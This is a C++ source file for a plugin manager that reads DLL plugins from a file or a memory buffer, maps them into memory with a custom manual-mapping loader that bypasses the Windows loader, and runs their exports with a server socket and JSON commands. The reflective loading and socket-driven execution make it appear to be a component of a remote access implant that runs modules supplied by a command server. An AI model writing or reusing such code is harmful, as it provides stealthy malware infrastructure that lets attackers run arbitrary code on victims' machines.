#include "PluginManager.hpp"
#include "MemoryLoader.hpp"
#include <iostream>
#include <fstream>

bool PluginManager::isPluginLoaded(const std::string& pluginId) {
    return loadedPlugins.find(pluginId) != loadedPlugins.end();
}

bool PluginManager::loadPluginFromMemory(const std::string& pluginId, const std::vector<unsigned char>& buffer) {
    std::cout << "[*] Loading plugin into memory: " << pluginId << std::endl;

    HMODULE hMod = MemoryLoader::Load(buffer);

    if (hMod) {
        loadedPlugins[pluginId] = hMod;
        return true;
    }
    return false;
}

bool PluginManager::loadPluginFromFile(const std::string& pluginId, const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[-] Failed to open plugin file: " << filePath << std::endl;
        return false;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> buffer(size);
    if (file.read((char*)buffer.data(), size)) {
        return loadPluginFromMemory(pluginId, buffer);
    }

    return false;
}

void PluginManager::executePlugin(const std::string& pluginId, const std::string& funcName, SOCKET serverSock) {
    if (!isPluginLoaded(pluginId)) return;

    typedef void (*PluginEntry)(SOCKET);
    // Manuel map yapıldığı için GetProcAddress yerine GetExportAddress kullanıyoruz
    PluginEntry func = (PluginEntry)MemoryLoader::GetExportAddress(loadedPlugins[pluginId], funcName.c_str());

    if (func) {
        std::cout << "[+] Executing plugin: " << pluginId << " -> " << funcName << std::endl;
        func(serverSock);
    } else {
        std::cerr << "[-] Plugin function not found: " << funcName << std::endl;
    }
}

void PluginManager::executePluginCommand(const std::string& pluginId, const std::string& funcName, SOCKET serverSock, const std::string& commandJson) {
    if (!isPluginLoaded(pluginId)) return;

    typedef void (*PluginCommandEntry)(SOCKET, const char*);
    PluginCommandEntry func = (PluginCommandEntry)MemoryLoader::GetExportAddress(loadedPlugins[pluginId], funcName.c_str());

    if (func) {
        std::cout << "[+] Executing plugin command: " << pluginId << " -> " << funcName << std::endl;
        func(serverSock, commandJson.c_str());
    } else {
        std::cerr << "[-] Plugin command function not found: " << funcName << std::endl;
    }
}
